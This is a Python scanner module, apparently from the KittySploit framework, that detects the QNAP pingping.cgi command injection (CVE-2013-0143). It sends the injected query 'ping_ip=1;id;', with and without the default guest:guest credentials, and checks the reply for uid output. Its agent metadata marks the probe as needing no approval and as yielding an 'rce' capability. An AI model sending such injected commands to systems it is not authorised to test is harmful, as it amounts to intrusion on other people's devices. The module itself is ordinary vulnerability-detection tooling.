#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""QNAP pingping.cgi command injection (CVE-2013-0143)."""

import base64
import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'QNAP - pingping.cgi RCE Detection (CVE-2013-0143)',
        'description': (
            'Detects CVE-2013-0143 by requesting /cgi-bin/pingping.cgi?ping_ip=1;id; '
            'with Basic guest:guest (or without auth).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2013', 'qnap', 'nas', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2013-0143',
        ],
        'cve': 'CVE-2013-0143',
    }

    def run(self):
        path = '/cgi-bin/pingping.cgi?ping_ip=1;id;'
        auth = 'Basic ' + base64.b64encode(b'guest:guest').decode()
        for headers in ({}, {'Authorization': auth}):
            r = self.http_request(method='GET', path=path, headers=headers, allow_redirects=False)
            if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='QNAP pingping.cgi RCE (CVE-2013-0143)',
                    path='/cgi-bin/pingping.cgi',
                )
                return True
        return False
